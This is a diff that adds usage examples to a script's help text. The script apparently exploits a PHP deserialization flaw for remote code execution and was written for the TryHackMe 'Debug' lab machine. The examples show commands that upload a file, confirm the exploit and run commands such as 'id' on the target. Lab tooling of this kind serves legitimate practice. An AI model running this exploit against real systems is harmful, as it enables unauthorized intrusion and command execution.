@@ -19,3 +19,15 @@ Optional Arguments:
   -banner               Banner script.
 
 Script developed specifically for Debug tryhackme machine.
+
+Examples:
+  python3 deserialization2RCE.py -u http://debug.thm/ -exploit myFile.php
+  python3 deserialization2RCE.py -u http://debug.thm/ -confirm_exploit myFile.php
+  python3 deserialization2RCE.py -u http://debug.thm/ -rce myFile.php -command id
+
+Avoiding exploit confirmation:
+  python3 deserialization2RCE.py -u http://debug.thm/ -exploit myFile.php -banner
+  python3 deserialization2RCE.py -u http://debug.thm/ -rce myFile.php -command id -banner
+
+Extra:
+  -banner parameter only shows sh3llr1ck0 banner in the terminal.
